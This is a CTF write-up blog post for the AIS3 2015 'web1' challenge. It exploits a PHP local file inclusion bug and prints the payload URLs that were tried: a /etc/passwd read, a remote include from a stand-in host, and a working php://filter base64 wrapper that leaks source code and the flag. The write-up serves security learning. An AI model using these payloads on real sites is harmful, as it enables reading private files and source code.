---
layout: post
title: 'AIS3 2015 Writeup: web1'
date: 2015-07-27 12:00
comments: true
tags: [ais3, ais3-2015]
categories: [post-ctf]
---
## Local File Inclusion (LFI) vulnerability

Keynote:

- php:// — Accessing various I/O streams

Reference:

- http://security.stackexchange.com/questions/90724/reading-php-comments-using-php-page-that-open-text-files-ctf
- https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

Tools:

- Base64 Online Decode https://www.base64decode.org/

瀏覽 http://52.69.163.194/web1/?page=about 發現內容是 include 自 about.php

```
http://52.69.163.194/web1/about.php
```

發現輸入相對路徑去讀取檔案是不可行的，php 出錯而沒有輸出結果

```
http://52.69.163.194/web1/?page=../web1/about
```

想要讀取 /etc/passwd 也不可行

```
http://52.69.163.194/web1/?page=/etc/passwd 
```

嘗試 include remote file 也不可行，allow_url_include 可能沒有開

```
http://52.69.163.194/web1/?page=http://somewhere/hackfile.php
```

最後解法是透過 php://filter 強迫 php 在 include file 之前，先把該檔案用 base64 編碼，之後網頁就吐出一堆 base64 文字串，再將文字串拿去 decode，就可以看到 php 原始碼，flag 就藏在裡面

	http://52.69.163.194/web1/?page=php://filter/convert.base64-encode/resource=index

	PGEgaHJlZj0nP3BhZ2U9YWJvdXQnPiBhYm91dCA8L2E+IDxiciAvPgo8YSBocmVmPSc/cGFnZT10ZXN0Jz4gdGVzdCA8L2E+IDxiciAvPgo8YnI+Cjxicj4KPD9waHAKCiAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOwoKICAgICAgICAkcGFnZSA9ICRwYWdlIC4gJy5waHAnOwogICAgICAgICRwYWdlID0gc3RyX3JlcGxhY2UoIi4uLyIsICIiLCAkcGFnZSk7CiAgICAgICAgaW5jbHVkZSggJHBhZ2UgKTsKCiAgICAgICAgLy8gdGhlIGtleSBpcyBBSVMze3BocF93cmFwcGVyX3JvY2tzfQ==

decode:

	<a href='?page=about'> about </a> <br />
	<a href='?page=test'> test </a> <br />
	<br>
	<br>
	<?php

	        $page = $_GET['page'];

	        $page = $page . '.php';
	        $page = str_replace("../", "", $page);
	        include( $page );

	        // the key is AIS3{php_wrapper_rocks}
